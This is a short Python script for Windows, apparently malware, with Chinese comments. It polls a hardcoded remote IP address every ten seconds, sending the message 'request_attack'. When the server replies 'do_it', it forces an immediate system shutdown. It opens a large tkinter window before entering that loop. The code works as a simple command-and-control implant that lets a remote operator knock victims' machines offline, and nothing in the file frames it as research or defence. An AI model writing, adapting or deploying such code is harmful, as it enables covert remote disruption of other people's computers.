#!/usr/bin/python
# -*- coding: UTF-8 -*
#pip install pypiwin32
import os
import socket
import time
import tkinter
import win32gui
import win32ui
import win32con
import win32api


def get_server_text():
	#开始创建socks
	sock = socket.socket()
	HOST = "167.179.65.135"
	PORT = 2233
	sock.connect((HOST, PORT))
	#发送模式
	sock.sendall("request_attack".encode())
	#接受服务器的状态码
	server_s = sock.recv(1024).decode()
	sock.close()

	if server_s == "do_it":
		return True
	else:
		return False
	


def kill_it():
	os.system("shutdown -s -t 0")


def main():
	while True:
		zt = 0
		#zt指的是服务器返回后的攻击标志，0为停止，1为开始
		try:
			if get_server_text():
				zt = 1
		except:
			pass

		if zt == 1:
			kill_it()

		time.sleep(10)



if __name__=='__main__':
	
	top = tkinter.Tk()
	# 进入消息循环
	top.geometry("2000x2000")
	top.mainloop()
	

	main()


